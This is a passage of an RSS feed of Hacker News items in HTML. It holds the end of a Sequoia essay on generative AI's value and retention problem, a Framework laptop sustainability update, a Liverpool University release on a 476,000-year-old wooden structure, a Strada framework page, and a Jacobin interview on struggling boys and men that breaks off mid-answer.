<li><strong>Generative AI is a thing. </strong>Suddenly, every developer was working on a generative AI application and every enterprise buyer was demanding it. The market even kept the “generative AI” moniker. Talent flowed into the market, as did venture capital dollars. Generative AI even became a pop culture phenomenon in viral videos like “Harry Potter Balenciaga” or the Drake imitation song “Heart on My Sleeve” by Ghostwriter which has become a chart-topping hit.</li>



<li><strong>The first killer apps emerged</strong>. It’s been well documented that ChatGPT was the fastest application to reach 100M MAU—and it did so organically in just 6 weeks. By contrast, Instagram took 2.5 years, WhatsApp took 3.5 years, and YouTube and Facebook took 4 years to reach that level of user demand. But ChatGPT is not an isolated phenomenon. The depth of engagement of Character AI (2 hour average session time), the productivity benefits of Github Copilot (55% more efficient), and the monetization path of Midjourney (hundreds of millions of dollars in revenue) all suggest that the first cohort of killer apps has arrived.</li>



<li><strong>Developers are the key</strong>. One of the core insights of developer-first companies like Stripe or Unity has been that developer access opens up use cases you could not even imagine. In the last several quarters, we have been pitched everything from music generation communities to AI matchmakers to AI customer support agents.</li>



<li><strong>The form factor is evolving. </strong>The first versions of AI applications have largely been autocomplete and first drafts, but these form factors are now growing in complexity. Midjourney’s introduction of camera panning and infilling is a nice illustration of how the generative AI-first user experience has grown richer. Across the board, form factors are evolving from individual to system-level productivity and from human-in-the-loop to execution-oriented agentic systems.</li>



<li><strong>Copyright and ethics and existential dread</strong>. The debate has roared on these hot-button topics. Artists and writers and musicians are split, with some creators rightfully outraged that others are profiting off derivative work, and some creators embracing the new AI reality (Grimes’ profit-sharing proposition and James Buckhouse’s optimism about becoming part of the <a href="https://buckhouse.medium.com/augmented-imagination-a3f4519f9784">creative genome</a> come to mind). No startup wants to be the <a href="https://www.fastcompany.com/90942310/ai-napster-who-going-to-own-it-next">Napster or Limewire to the eventual Spotify</a> (h/t Jason Boehmig). The rules are opaque: Japan has declared that content used to train AI has no IP rights, while Europe has proposed heavy-handed regulation.&nbsp;</li>
</ol>



<h2>Where do we stand now? Generative AI’s Value Problem</h2>



<p>Generative AI is not lacking in use cases or customer demand. Users crave AI that makes their jobs easier and their work products better, which is why they have flocked to applications in record-setting droves (in spite of a lack of natural distribution).&nbsp;</p>



<figure><img decoding="async" src="https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-100m.png?w=1024" alt="" width="620" srcset="https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-100m.png 1200w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-100m.png?resize=300,167 300w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-100m.png?resize=768,427 768w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-100m.png?resize=1024,569 1024w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-100m.png?resize=220,122 220w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-100m.png?resize=680,378 680w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-100m.png?resize=930,517 930w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-100m.png?resize=480,267 480w" sizes="(max-width: 1200px) 100vw, 1200px"></figure>



<p>But do people stick around? Not really. The below chart compares the month 1 mobile app retention of AI-first applications to existing companies.&nbsp;</p>



<figure><img decoding="async" src="https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-retention.png?w=824" alt="" width="620" srcset="https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-retention.png 1200w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-retention.png?resize=241,300 241w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-retention.png?resize=768,955 768w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-retention.png?resize=824,1024 824w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-retention.png?resize=121,150 121w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-retention.png?resize=680,845 680w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-retention.png?resize=930,1156 930w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-retention.png?resize=480,597 480w" sizes="(max-width: 1200px) 100vw, 1200px"></figure>



<p>User engagement is also lackluster. Some of the best consumer companies have 60-65% DAU/MAU; WhatsApp’s is 85%. By contrast, generative AI apps have a median of 14% (with the notable exception of Character and the “AI companionship” category). This means that users are not finding enough value in Generative AI products to use them every day yet.</p>



<figure><img decoding="async" src="https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-dau-mau.png?w=789" alt="" width="620" srcset="https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-dau-mau.png 1200w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-dau-mau.png?resize=231,300 231w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-dau-mau.png?resize=768,997 768w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-dau-mau.png?resize=789,1024 789w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-dau-mau.png?resize=1183,1536 1183w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-dau-mau.png?resize=116,150 116w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-dau-mau.png?resize=680,883 680w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-dau-mau.png?resize=930,1207 930w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-dau-mau.png?resize=480,623 480w" sizes="(max-width: 1200px) 100vw, 1200px"></figure>



<p>In short, generative AI’s biggest problem is not finding use cases or demand or distribution, it is proving value. As our colleague David Cahn writes, “the <a href="https://www.sequoiacap.com/article/follow-the-gpus-perspective/">$200B question</a> is: What are you going to use all this infrastructure to do? How is it going to change people’s lives?” The path to building enduring businesses will require fixing the retention problem and generating deep enough value for customers that they stick and become daily active users.</p>



<p>Let’s not despair. Generative AI is still in its “awkward teenage years.” There are glimpses of brilliance, and when the products fall short of expectations the failures are often reliable, repeatable and fixable. Our work is cut out for us.&nbsp;</p>



<h2>Act Two: A Shared Playbook</h2>



<p>Founders are embarking on the hard work of prompt engineering, fine tuning and dataset curation to make their AI products *good*. Brick by brick, they are building flashy demos into whole product experiences. And meanwhile, the foundation model substrate continues to brim with research and innovation.</p>



<p>A shared playbook is developing as companies figure out the path to enduring value. We now have shared techniques to make models useful, as well as emerging UI paradigms that will shape generative AI’s second act.</p>



<p><strong>The Model Development Stack</strong></p>



<ul>
<li><strong>Emerging reasoning techniques like chain-of-thought, tree-of-thought and reflexion</strong> are improving models’ ability to perform richer, more complex reasoning tasks, closing the gap between customer expectations and model capabilities. Developers are using frameworks like <a href="http://langchain.com/">Langchain</a> to invoke and debug more complex multi-chain sequences.</li>



<li><strong>Transfer learning techniques like RLHF and fine-tuning </strong>are becoming more accessible, especially with the recent availability of fine-tuning for GPT-3.5 and Llama-2, which means that companies can adapt foundation models to their specific domains and improve from user feedback. Developers are downloading open-source models from <a href="http://huggingface.co/">Hugging Face</a> and fine-tuning them to achieve <a href="https://www.anyscale.com/blog/fine-tuning-llms-lora-or-full-parameter-an-in-depth-analysis-with-llama-2">quality</a> performance.</li>



<li><strong>Retrieval-augmented generation</strong> is bringing in context about the business or the user, reducing hallucinations and increasing truthfulness and usefulness. Vector databases from companies like <a href="http://pinecone.io/">Pinecone</a> have become the infrastructure backbone for RAG.</li>



<li><strong>New developer tools and application frameworks </strong>are giving companies reusable building blocks to create more advanced AI applications and helping developers evaluate, improve and monitor the performance of AI models in production, including LLMOps tools like <a href="https://www.langchain.com/langsmith">Langsmith</a> and <a href="http://wandb.ai/">Weights &amp; Biases</a>&nbsp;</li>



<li><strong>AI-first infrastructure companies </strong>like <a href="http://corweave.com/">Coreweave</a>, <a href="https://lambdalabs.com/">Lambda Labs</a>, <a href="https://mlfoundry.com/">Foundry</a>, <a href="https://replicate.com/">Replicate</a> and <a href="https://modal.com/">Modal</a> are unbundling the public clouds and providing what AI companies need most: plentiful GPUs at a reasonable cost, available on-demand and highly scalable, with a nice PaaS developer experience.</li>
</ul>



<p>Together, these techniques should close the expectations vs reality gap for models as the underlying foundation models simultaneously improve. But making the models great is only half the battle. The playbook for a generative AI-first user experience is evolving as well:</p>



<p><strong>Emerging Product Blueprints</strong></p>



<ul>
<li><strong>Generative interfaces</strong>. A text-based conversational user experience is the default interface on top of an LLM. Gradually, newer form factors are entering the arsenal, from Perplexity’s <a href="https://twitter.com/alexgraveley/status/1659276299091812353">generative user interfaces</a> to new modalities like human-sounding voices from Inflection AI.&nbsp;</li>



<li><strong>New editing experiences: from Copilot to Director’s Mode</strong>. As we advance from zero-shot to <a href="https://thezbook.com/ask-adjust-the-future-of-productivity-interfaces">ask-and-adjust</a> (h/t Zach Lloyd), generative AI companies are inventing a new set of knobs and switches that look very different from traditional editing workflows. Midjourney’s new panning commands and Runway’s Director’s Mode create new camera-like editing experiences. Eleven Labs is making it possible to manipulate voices through prompting.</li>



<li><strong>Increasingly sophisticated agentic systems. </strong>Generative AI applications are increasingly not just autocomplete or first drafts for human review; they now have the autonomy to problem-solve, access external tools and solve problems end-to-end on our behalf. We are steadily progressing from level 0 to level 5 autonomy.&nbsp;</li>



<li><strong>System-wide optimization</strong>. Rather than embed in a single human user’s workflow and make that individual more efficient, some companies are directly tackling the system-wide optimization problem. Can you pick off a chunk of support tickets or pull requests and autonomously solve them, thereby making the whole system more effective?</li>
</ul>



<h2>Parting Thoughts</h2>



<p>As we approach the <a href="https://www.sequoiacap.com/article/ai-paradox-perspective/">frontier paradox</a> and as the novelty of transformers and diffusion models dies down, the nature of the generative AI market is evolving. Hype and flash are giving way to real value and whole product experiences.</p>



<p>At Sequoia we remain steadfast believers in generative AI. The necessary conditions for this market to take flight have accumulated over the span of decades, and the market is finally here. The emergence of killer applications and the sheer magnitude of end user demand has deepened our conviction in the market.</p>



<p>However, Amara’s Law—the phenomenon that we tend to overestimate the effect of a technology in the short run and underestimate the effect in the long run—is running its course. We are applying patience and judgment in our investment decisions, with careful attention to how founders are solving the value problem. The shared playbook companies are using to push the boundaries on model performance and product experiences gives us optimism on generative AI’s second act.</p>



<p><br><em>If you are building in the AI market with an eye towards value and whole product experiences, we would love to hear from you. Please email Sonya (<a href="mailto:sonya@sequoiacap.com">sonya@sequoiacap.com</a>) and Pat (</em><a href="mailto:grady@sequoiacap.com"><em>grady@sequoiacap.com</em></a><em>). Our third coauthor does not have an email address yet, sadly :-).</em></p>
</section>











<div data-columns="12">

					<p>
						JOIN OUR MAILING LIST					</p>

					<h2>
						Get the best stories from the Sequoia community.					</h2>

					
					
					

				</div>
</article>
	</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[We Are Not Sustainable (195 pts)]]></title>
            <link>https://frame.work/nl/en/blog/we-are-not-sustainable</link>
            <guid>37588374</guid>
            <pubDate>Wed, 20 Sep 2023 18:52:42 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://frame.work/nl/en/blog/we-are-not-sustainable">https://frame.work/nl/en/blog/we-are-not-sustainable</a>, See on <a href="https://news.ycombinator.com/item?id=37588374">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
<p>And neither is any other device maker.&nbsp;This industry is full of "feel good" messaging, but generates 50 million metric tons of e-waste each year. We believe the best way to reduce environmental impact is to create products that last longer, meaning fewer new ones need to be made. Instead of operating on feels, we operate on data and actions.&nbsp;With funding from Intel, we commissioned Fraunhofer IZM to do a detailed life cycle analysis (LCA) on Framework Laptop 13 to help us understand where we are today and where we can continue to improve.&nbsp;Check out our thoughts on reducing environmental impact and download the LCA report <a href="https://frame.work/sustainability">here</a>.</p>
<h2>Production update on Framework Laptop 13 (AMD Ryzen 7040 Series)</h2>

<p>We continue to be on track to start shipments before the end of the month on the new Framework Laptop 13 (AMD Ryzen 7040 Series). Last week we shared that SMT (Mainboard production) had started, and this week we’ve begun final assembly of laptops. We also pulled some early units to send out to press reviewers to make sure that you can see exactly where we’ve landed on performance and battery life.&nbsp;We have another happy bit of news to share with you: our Lead System Architect Kieran was able to implement a firmware solution to reduce power consumption when using HDMI and DP Expansion Cards on the back two slots.&nbsp;The only remaining power issue is with USB-A Expansion Cards on the back slots, which we are investigating a future USB-A Expansion Card hardware revision to resolve.</p>
<p><img src="https://images.prismic.io/frameworkmarketplace/dedd997a-b978-43d2-a654-2c8ce151adcf_sustainability-blog-2.png?auto=compress,format" alt="Holding a Framework Mainboard" width="1796" height="1310"></p>
<h2>Modular gaming handheld by pitstoptech</h2>
<p>We are constantly amazed by the ways community members re-mix modules from Framework Laptops. The most recent mind-blowing example is a <a href="https://www.youtube.com/watch?v=zd6WtTUf-30" target="_blank" rel="noopener">modular gaming handheld by pitstoptech</a> with detachable controllers, using a Framework Laptop 13 Mainboard and Battery.&nbsp;This specific instance incorporates last year’s 12th Gen Intel Core Mainboard, but with this year’s Ryzen 7040 Mainboards, gaming performance should exceed Steam Deck and other similar handhelds. This is a great way to re-use Mainboards, whether you have a leftover one after upgrading your Framework Laptop or you picked up one of the <a href="https://frame.work/products/mainboard-11th-gen-intel-core?v=FRANFG000B">newly discounted ones</a> in the Marketplace.&nbsp;You can follow along for updates on pitstoptech’s YouTube channel or <a href="https://community.frame.work/t/framework-gaming-handheld-video/36591" target="_blank" rel="noopener">in the Framework Community</a>.</p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Archaeologists discover oldest wooden structure (173 pts)]]></title>
            <link>https://news.liverpool.ac.uk/2023/09/20/archaeologists-discover-worlds-oldest-wooden-structure/</link>
            <guid>37587791</guid>
            <pubDate>Wed, 20 Sep 2023 18:18:14 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://news.liverpool.ac.uk/2023/09/20/archaeologists-discover-worlds-oldest-wooden-structure/">https://news.liverpool.ac.uk/2023/09/20/archaeologists-discover-worlds-oldest-wooden-structure/</a>, See on <a href="https://news.ycombinator.com/item?id=37587791">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
	                <p><img src="https://news.liverpool.ac.uk/wp-content/uploads/2023/09/2-Larry.png" alt="Uncovering the wooden structure with a fine spray on the banks of the river" decoding="async" fetchpriority="high"></p>
			<p>Half a million years ago, earlier than was previously thought possible, humans were building structures made of wood, according to new research by a team from the University of Liverpool and Aberystwyth University.</p>
<p>The research, published in the journal <em>Nature, </em>reports on the excavation of well-preserved wood at the archaeological site of Kalambo Falls, Zambia, dating back at least 476,000 years and predating the evolution of our own species, <em>Homo sapiens.</em></p>
<p><img decoding="async" src="https://news.liverpool.ac.uk/wp-content/uploads/2023/09/5-the-wooden-structure.png" alt="The excavation team uncovering the wooden wedge" width="399" height="598"></p>
<p>Expert analysis of stone tool cut-marks on the wood show that these early humans shaped and joined two large logs to make a structure, probably the foundation of a platform or part of a dwelling.</p>
<p>This is the earliest evidence from anywhere in the world of the deliberate crafting of logs to fit together. Until now, evidence for the human use of wood was limited to its use for making fire, digging sticks and spears.</p>
<p>Wood is rarely found in such ancient sites as it usually rots and disappears, but at Kalambo Falls permanently high water levels preserved the wood.</p>
<p><img decoding="async" src="https://news.liverpool.ac.uk/wp-content/uploads/2023/09/2-Larry-1.png" alt="Researchers uncover wooden artefacts on the banks of the Kalambo River in Zambia, near where the oldest-known use of wood in construction was found" width="481" height="342"></p>
<p>This discovery challenges the prevailing view that Stone Age humans were nomadic. At Kalambo Falls these humans not only had a perennial source of water, but the forest around them provided enough food to enable them to settle and make structures.</p>
<p><a href="https://www.liverpool.ac.uk/archaeology-classics-and-egyptology/staff/lawrence-barham/">Professor Larry Barham</a>, from the University of Liverpool’s <a href="https://www.liverpool.ac.uk/archaeology-classics-and-egyptology/">Department of Archaeology, Classics and Egyptology</a>, who leads the <a href="https://www.liverpool.ac.uk/archaeology-classics-and-egyptology/">‘Deep Roots of Humanity’</a> research project said:</p>
<blockquote><p>This find has changed how I think about our early ancestors. Forget the label ‘Stone Age,’ look at what these people were doing: they made something new, and large, from wood. They used their intelligence, imagination, and skills to create something they’d never seen before, something that had never previously existed.</p>
<p>They transformed their surroundings to make life easier, even if it was only by making a platform to sit on by the river to do their daily chores. These folks were more like us than we thought.</p></blockquote>
<p>The specialist dating of the finds was undertaken by experts at Aberystwyth University.</p>
<p><img decoding="async" loading="lazy" src="https://news.liverpool.ac.uk/wp-content/uploads/2023/09/3-uncovering-the-wood.png" alt="Researchers uncover a wooden structure on the banks of the Kalambo River in Zambia that represents the oldest-known use of wood in construction " width="507" height="361"></p>
<p>They used new luminescence dating techniques, which reveal the last time minerals in the sand surrounding the finds were exposed to sunlight, to determine their age.</p>
<p><a href="https://www.aber.ac.uk/en/dges/staff-profiles/listing/profile/ggd/">Professor Geoff Duller</a> from Aberystwyth University said:</p>
<blockquote><p>At this great age, putting a date on finds is very challenging and we used luminescence dating to do this. These new dating methods have far reaching implications – allowing us to date much further back in time, to piece together sites that give us a glimpse into human evolution. The site at Kalambo Falls had been excavated back in the 1960s when similar pieces of wood were recovered, but they were unable to date them, so the true significance of the site was unclear until now.</p></blockquote>
<p>The site of Kalambo Falls on the <a href="https://en.wikipedia.org/wiki/Kalambo_River">Kalambo River</a> lies above a 235 metres (772 foot) <a href="https://en.wikipedia.org/wiki/Waterfall">waterfall</a> on the border of <a href="https://en.wikipedia.org/wiki/Zambia">Zambia</a> with the <a href="https://en.wikipedia.org/wiki/Rukwa_Region">Rukwa Region</a> of <a href="https://en.wikipedia.org/wiki/Tanzania">Tanzania</a> at the edge of <a href="https://en.wikipedia.org/wiki/Lake_Tanganyika">Lake Tanganyika</a>. The area is on a ‘tentative‘ list from UNESCO for becoming a World Heritage site because of its archaeological significance.</p>
<div id="attachment_114395"><p><img aria-describedby="caption-attachment-114395" decoding="async" loading="lazy" src="https://news.liverpool.ac.uk/wp-content/uploads/2023/09/wooden-structure.png" alt="" width="652" height="360"></p><p id="caption-attachment-114395">The wooden structure</p></div>
<p>Professor Duller added:</p>
<p>“Our research proves that this site is much older than previously thought, so its archaeological significance is now even greater. It adds more weight to the argument that it should be a United Nations World Heritage Site.”</p>
<p><img decoding="async" loading="lazy" src="https://news.liverpool.ac.uk/wp-content/uploads/2023/09/1-Falls.jpg" alt="Kalambo Falls in Zambia, near the location where the oldest-known use of wood in construction was found" width="447" height="671"></p>
<p>This research forms part of the pioneering ‘Deep Roots of Humanity’ project, an investigation into how human technology developed in the Stone Age. The project is funded by the UK’s Arts and Humanities Research Council and involved teams from Zambia’s National Heritage Conservation Commission, Livingstone Museum, Moto Moto Museum and the National Museum, Lusaka.</p>
<p>Professor Barham added:</p>
<p>“Kalambo Falls is an extraordinary site and a major heritage asset for Zambia. The Deep Roots team is looking forward to more exciting discoveries emerging from its waterlogged sands.”</p>
<p><span dir="ltr">Interested in studying Archaeology or similar subjects? Find out more<a href="https://www.liverpool.ac.uk/study/subjects/archaeology-classics-and-egyptology/"> here.</a></span><br>
<iframe loading="lazy" title="YouTube video player" src="https://www.youtube.com/embed/o6_4evj5uaA?si=8TyDuqh0X_VDgbwW" width="560" height="315" frameborder="0" allowfullscreen="allowfullscreen"></iframe></p>

					</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Car showed pop-up while driving (237 pts)]]></title>
            <link>https://glitterkitten.co.uk/@ellavescent/111091652921668380</link>
            <guid>37587510</guid>
            <pubDate>Wed, 20 Sep 2023 18:00:48 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://glitterkitten.co.uk/@ellavescent/111091652921668380">https://glitterkitten.co.uk/@ellavescent/111091652921668380</a>, See on <a href="https://news.ycombinator.com/item?id=37587510">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[Strada – Create fully native controls, driven by your web app (181 pts)]]></title>
            <link>https://strada.hotwired.dev/</link>
            <guid>37587506</guid>
            <pubDate>Wed, 20 Sep 2023 18:00:26 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://strada.hotwired.dev/">https://strada.hotwired.dev/</a>, See on <a href="https://news.ycombinator.com/item?id=37587506">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="content">

  
<p>
  <h2>
    Create fully native controls, driven by your web app.
  </h2>
</p>

<p>
  <span>Current version: <a href="https://github.com/hotwired/strada-web/releases/tag/v1.0.0-beta1">1.0.0-beta1</a> — released Sep 19, 2023</span>
</p>

<section>
  <p>
    <b>Strada</b> enables you to create fully native controls in your hybrid mobile apps, driven by the web. Build web components and native components that work together in <i>WebView</i> screens to elevate your <a href="https://turbo.hotwired.dev/handbook/native">Turbo Native</a> apps to the next level.
  </p>

  <ul>
    <li><a href="https://strada.hotwired.dev/handbook/web">Strada Web</a> enables you to use your existing HTML to create web components that send and respond to messages with components in your native apps.</li>
    <li><a href="https://strada.hotwired.dev/handbook/ios">Strada iOS</a> and <a href="https://strada.hotwired.dev/handbook/android">Strada Android</a> enable you to create native components that receive and reply to messages from web components that are present on the page. All without writing any JavaScript in your native apps.</li>
  </ul>

  <p>
    Strada components leverage <a href="https://stimulus.hotwired.dev/">Stimulus</a> and works seamlessly with <a href="https://turbo.hotwired.dev/">Turbo</a> web and <a href="https://turbo.hotwired.dev/handbook/native">Turbo Native</a> apps.
  </p>

</section>



<p>
  <a href="https://world.hey.com/hotwired">Subscribe to project updates over email</a>.
</p>


</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Boys and Men in the United States Are Struggling. The Left Should Talk About It (150 pts)]]></title>
            <link>https://jacobin.com/2023/09/boys-men-work-despair-struggling-wages-education/</link>
            <guid>37586942</guid>
            <pubDate>Wed, 20 Sep 2023 17:22:04 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://jacobin.com/2023/09/boys-men-work-despair-struggling-wages-education/">https://jacobin.com/2023/09/boys-men-work-despair-struggling-wages-education/</a>, See on <a href="https://news.ycombinator.com/item?id=37586942">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="post-content">

                <!-- Antescript -->

                
                  
                

                <!-- Intro -->
                
                  
                    
    <dl>
      <dt>Interview by</dt>
      
        <dd>
          <a href="https://jacobin.com/author/david-sirota">David Sirota</a>
        </dd>
      
    </dl>
  
                  
                

                
                  
                    <section id="ch-0">
                      <p>Statistics show that men and boys in the United States today disproportionately suffer from a number of serious problems. Since the 1970s, they’ve seen their wages stagnate and are now far less likely than women to attend or graduate from college. Even more seriously, men are much more likely than women to be afflicted by “deaths of despair”: deaths due to suicide or alcohol or drug abuse. These trends are affecting boys and men across racial groups, and especially working-class boys and men.</p>
<p>Richard Reeves, a senior fellow at the Brookings Institution, is the author of <a href="https://www.brookings.edu/books/of-boys-and-men/"><i>Of Boys and Men: Why the Modern Male Is Struggling, Why It Matters, and What to Do About It</i></a>. For the <a href="https://www.levernews.com/the-american-masculinity-crisis/"><i>Lever Time</i></a><i> </i>podcast, <i>Jacobin </i>editor at large David Sirota interviewed Reeves about the crisis afflicting men, how right-wing politicians have weaponized it to promote a reactionary agenda, and how the Left might come up with a better response to men’s problems. This transcript has been edited for length and clarity.</p>

                    </section>
                  
                

                <!-- Main Content -->

                
    
      
        <section id="ch-1">
          
            
            <hr>
          
          
            <div>
                <p><span>
                  
                    
                      David Sirota
                </span></p><p>What are some of the most telling signals that the modern male is struggling — and specifically as a group, as distinct from the struggles of the population writ large?</p>

              </div>
            <div>
                <p><span>
                  
                    
                      Richard Reeves
                </span></p><p>Let’s start with the economy and the labor market, where the well-told story about wage stagnation is particularly acute for men. Most American men earned less in 2019 than most American men did in 1979.</p>
<p>Of course, it’s also true that wages didn’t grow that quickly for working-class women by comparison to other women. But women’s wages did grow across the board — just faster at the top than at the bottom — whereas for men you saw wage stagnation.</p>
<p>What that means is that the only reason that middle-class American households saw any rise in their household incomes at all over that period was because of women. It was women’s work, women’s wages. So there’s all kinds of downstream consequences.</p>
<p>Then if we turn to something like education, what we see is a massive overtaking by girls and women of men, such that there’s now a bigger gender gap in education today than there was in 1972. On college campuses, for example, women are further ahead of men now than men were ahead of women when we passed Title IX in 1972.</p>
<p>Some of the consequences for that are difficulties around family formation and deaths of despair. There’s been lots of discussion of deaths of despair — which are from suicide, alcohol, or drugs — but maybe a little less attention to the fact that men are at least three times higher risk of one of those deaths of despair than women are. Deaths of despair are largely a male — and largely a working-class male — problem.</p>

              </div>
          
            <div>
                <p><span>
                  
                    
                      David Sirota
                </span></p><p>There has been a gender wage gap for a very long time. Are you saying that what we’ve seen is that the gap has somewhat narrowed not just because women’s wages are going up, but also because men’s wages have stagnated or actually dropped? There’s an alternate history where everything is improving for both men and women, but it improves more quickly for women to deal with historic disparities. But you’re saying that’s not happening: it’s a negative story for men.</p>

              </div>
            <div>
                <p><span>
                  
                    
                      Richard Reeves
                </span></p><p>In terms of earnings, yes. The gender pay gap is typically measured at the median. So when people hear that women earn eighty-two or eighty-three cents on the dollar versus men, what’s being referred to there is median pay. One reason why the gender pay gap has narrowed over the last few decades is that women’s wages have risen quite sharply at the median — 30-something percent or more — but part of it is because male wages have dropped at the median.</p>
<p>That’s not the main reason for the narrowing, but it’s one of the reasons, and I don’t think it’s controversial to suggest that that’s bad news. If we’d seen similar levels of women’s wage growth at the median, and we hadn’t seen wage stagnation for men, it’s not clear to me that that would have been a worse world. I don’t think many people want to close the gender wage gap by crashing male wages.</p>

<p>At the top of the distribution, men and women have seen rising wages. Up toward that eightieth or ninetieth percentile, women have seen faster wage growth, but both men and women have seen it.</p>
<p>My overall understanding of these labor market trends over the last few decades is that we’ve seen a narrowing of the gender wage gap, for the reasons we just discussed, and a sharp widening of the class wage gap. They’re pulling in different directions. So the gap between the median and the top has gotten much wider, but the gap between men and women at each level has gotten narrower.</p>

              </div>
          
            <div>
                <p><span>
                  
                    
                      David Sirota
                </span></p><p>I want to ask about the maleness part of this, in looking at wages, jobs, education levels, health care, deaths of despair, and so on. How much of this is related to maleness, however we define that, rather than other factors like economic inequality, geography, or education? How do we narrow in on this as a problem of maleness specifically?</p>

              </div>
            <div>
                <p><span>
                  
                    
                      Richard Reeves
                </span></p><p>There is enough evidence that some of these problems do break quite strongly along male-female lines, so as to justify the attention on men in particular. The male suicide rate is four times higher than the female suicide rate. It has risen by 25 percent in the last decade and rose very sharply between 2020 and 2021, 8 percent for young men alone. And there wasn’t an increase for women.</p>
<p>That isn’t to say that female suicide isn’t a problem; of course it is. Sometimes, when I’m drawing attention to the gaps in education, people will say, no one cared when it was the other way around, when women were that far behind men. To that, my answer is: yeah, people did care. And we did a whole bunch of stuff about it, and quite rightly too. We passed laws; we had significant campaigns to try and overcome it.</p>
<p>To some extent, it becomes an empirical question as to whether there’s enough of a gender gap here on whatever the issue is to say, we should look at that. I would say the same is true the other way around. For example, the gender pay gap we’ve just talked about — just because 40 percent of women earn more than the average man now doesn’t mean there isn’t still an issue about gender pay gaps.</p>
<p>I’d look at the data on it and say, is there a strong enough pattern here to make you think this is worth looking at through that lens? There’ll be a whole bunch of issues where you’re like, “There isn’t much to see here in terms of gender.”</p>
<p>But there are other issues where there clearly is, in one direction or the other, and then I think we should be gender sensitive. We should also look at how that intersects by class, by race, and so on. So we might talk about the gender pay gap, but we shouldn’t forget the fact that white women now earn a lot more than black men.</p>
<p>That wasn’t true in 1979. So white women have seen very strong increases in their wages, such that for every dollar earned by a white woman, a black man earns about eighty-four cents, which is similar to the gender gap.</p>
<p>The point of that is not to say that the gender gap isn’t important and real. It is just to say that it’s very important that we don’t look at these things just through one lens, but try to look at them through different lenses.</p>

              </div>
          
            <div>
                <p><span>
                  
                    
                      David Sirota
                </span></p><p>What is fueling this dynamic? Is it mostly the economic issues that you mentioned? Does it have to do with the changing nature of our culture? Is it something in our politics?</p>

              </div>
            <div>
                <p><span>
                  
                    
                      Richard Reeves
                </span></p><p>I put it under three headings. Number one is, almost independently of everything else, the education system isn’t doing very well by lots of our boys and men now. We have a ten percentage point drop in the share of male teachers, incredible underinvestment in apprenticeships and vocational forms of learning, and all kinds of changes in school environments that mean that we’re not serving them very well.</p>
<p>That’s not to suggest that there aren’t plenty of girls who aren’t being served well too. But overall, young men hit the labor market or college or whatever less well-prepared as a result of the education system. The single biggest risk factor for dropping out of college, controlling for everything else, is being male. They struggle throughout education; they might struggle to land in the labor market.</p>
<p>The second bucket is that the labor market has been transformed in the last forty or fifty years in such a way as to make it much more difficult for men with modest levels of education to do OK.</p>

<p>We can have a very long discussion as to why that is: globalization, deunionization, loss of all kinds of jobs, and so on. It’s not because women came into the labor market; it’s because of these other external shocks to the labor market.</p>
<p>Then bucket number three is the most contentious one, in a way. The fact that women have seen such a massive increase in their economic independence means that the basis upon which men and women form families and relationships has been significantly transformed. In the space of not much more than a generation, the presumption of the male breadwinner has largely unraveled. In my view, that’s a great thing.</p>
<p>However, I think that has left a lot of men struggling to catch up with a culture where their role as a breadwinner has been undermined by economic brute facts, and then has been undermined by changes in their relationships to women, and they’ve come into it ill-served as well. So you have underskilled men facing a labor market that’s become a bit more hostile than the one their dads faced, and women who are saying, “Well, I might not need you.” I think all of those feed off each other.</p>

              </div>
          
            <div>
                <p><span>
                  
                    
                      David Sirota
                </span></p><p>In the past several years, we’ve seen right-wing politicians like Josh Hawley and Ted Cruz talk about the so-called attack on masculinity. We’ve seen YouTubers whose entire business model seems to be repackaging and selling one version of masculinity. We’ve seen gun marketing trying to fuse masculinity with the idea of buying weapons, owning weapons, shooting weapons.</p>
<p>Why do you think these messages have become so effective? What do you think would be a more constructive counternarrative to those kinds of messages?</p>

              </div>
            <div>
                <p><span>
                  
                    
                      Richard Reeves
